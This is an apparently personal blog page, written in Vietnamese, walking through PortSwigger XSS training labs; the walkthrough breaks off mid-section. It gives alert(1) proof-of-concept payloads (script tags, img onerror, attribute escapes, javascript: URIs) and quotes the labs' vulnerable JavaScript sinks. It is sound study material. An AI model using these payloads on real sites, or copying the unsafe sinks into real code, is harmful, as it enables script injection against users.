@@ -1,0 +1,2668 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/XSS/">
+      
+      
+        <link rel="prev" href="../DOM-based%20vulnerabilities/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>XSS - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xss" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XSS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h1>
+<h1 id="lab-reflected-xss-into-html-context-with-nothing-encoded"><strong>Lab: Reflected XSS into HTML context with nothing encoded</strong><a class="headerlink" href="#lab-reflected-xss-into-html-context-with-nothing-encoded" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">Lab: Reflected XSS into HTML context with nothing encoded | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code></p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện chèn script <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> . Quan sát thấy alert thành công hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-stored-xss-into-html-context-with-nothing-encoded"><strong>Lab: Stored XSS into HTML context with nothing encoded</strong><a class="headerlink" href="#lab-stored-xss-into-html-context-with-nothing-encoded" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded">Lab: Stored XSS into HTML context with nothing encoded | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng comment. Tại đây thực hiện chèn script <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> vào comment</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện chức năng <code>Post Comment</code> . Quan sát thấy alert thành công. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch"><strong>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></strong><a class="headerlink" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink">Lab: DOM XSS in document.write sink using source location.search | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Khi thực hiện view-source, em thấy có xử lý param đưa vào như sau:</p>
+<ul>
+<li>
+<p>Code</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">                        </span><span class="kd">function</span><span class="w"> </span><span class="nx">trackSearch</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                            </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#39;</span><span class="o">+</span><span class="nx">query</span><span class="o">+</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">);</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                        </span><span class="kd">var</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)).</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;search&#39;</span><span class="p">);</span>
+<span class="w">                        </span><span class="k">if</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                            </span><span class="nx">trackSearch</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Bởi vì code nối trực tiếp query không qua xử lý nên em có thể escape như sau:</p>
+<ul>
+<li>
+<p>Code</p>
+<div class="highlight"><pre><span></span><code><span class="nx">abcxxxxxxxxxx</span><span class="err">&quot;</span><span class="w"> </span><span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Giải thích: khi truyền payload trên, code render lên sẽ như sau:</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+<li>
+<p>Em đã thử dùng onerror nhưng không được, tuy nhiên onload thì được em nghĩ là src kia không bị lỗi ạ.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-dom-xss-in-innerhtml-sink-using-source-locationsearch"><strong>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></strong><a class="headerlink" href="#lab-dom-xss-in-innerhtml-sink-using-source-locationsearch" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink">Lab: DOM XSS in innerHTML sink using source location.search | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code>.</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+<li>
+<p>Thực hiện truyền payload sau. Quan sát thấy alert và hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Đây là đoạn js chứa lỗ hổng</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">doSearchQuery</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;searchMessage&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">query</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)).</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;search&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">doSearchQuery</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+<h1 id="lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source"><strong>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</strong><a class="headerlink" href="#lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink">Lab: DOM XSS in jQuery anchor href attribute sink using location.search source | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Submit feedback</code> . Quan sát thấy đường dẫn có param <code>returnPath</code> được lấy đẩy vào link của chức năng <code>Back</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Ở đây, chúng ta có thể gọi scheme <code>javascript</code> như sau trong <code>href</code> để thực thi</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+</ul>
+<h1 id="lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event"><strong>Lab: DOM XSS in jQuery selector sink using a hashchange event</strong><a class="headerlink" href="#lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event">Lab: DOM XSS in jQuery selector sink using a hashchange event | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện view source và quan sát thấy có đoạn js sau. Đoạn js thực hiện nhận thay đổi của hash và sử dụng jQuery để tìm kiếm đoạn nào chứa hash đó.</p>
+<ul>
+<li>
+<p>Code</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="nx">$</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;hashchange&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
+<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">post</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;section.blog-list h2:contains(&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">1</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;)&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">post</span><span class="p">)</span><span class="w"> </span><span class="nx">post</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="mf">0</span><span class="p">).</span><span class="nx">scrollIntoView</span><span class="p">();</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Vì trình selector của jQuery có thể coi input vào như selector và tìm kiếm, nhưng cũng có thể coi đó là HTML element ⇒ có thể truyền thẻ HTML để chạy code</p>
+</li>
+<li>
